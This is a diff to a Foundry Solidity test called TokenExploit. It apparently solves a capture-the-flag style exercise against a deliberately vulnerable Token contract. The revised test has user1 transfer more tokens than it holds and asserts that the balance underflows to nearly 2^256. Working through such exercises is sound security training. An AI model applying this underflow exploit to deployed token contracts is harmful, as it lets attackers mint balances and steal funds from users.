@@ -11,38 +11,32 @@ contract TokenExploit is Test
 
   Token tk;
   address owner;
-  address user;
+  address user1;
+  address user2;
 
   function setUp() public
   {
     owner = address(this);
-    user = makeAddr("user");
+    user1 = makeAddr("user1");
+    user2 = makeAddr("user2");
     tk = new Token(1000);
   }
 
   function testExploit() public
   {
-    console.log("1111");
-
     if (tk.balanceOf(owner) != 1000)
       revert incorrectBalance();
 
-    console.log("2222");
-
-    tk.transfer(address(user), 20);
+    tk.transfer(address(user1), 20);
 
     if (tk.balanceOf(owner) != 980)
       revert incorrectBalance();
 
-    console.log("3333");
+    vm.prank(user1);
+    tk.transfer(address(user2), 1000);
 
-    vm.prank(user);
-    tk.transfer(address(user), 900);
-
-    if (tk.balanceOf(owner) != 80)
+    if (tk.balanceOf(user1) != 115792089237316195423570985008687907853269984665640564039457584007913129638956)
       revert incorrectBalance();
-    
-    console.log("4444");
   }
 }
 
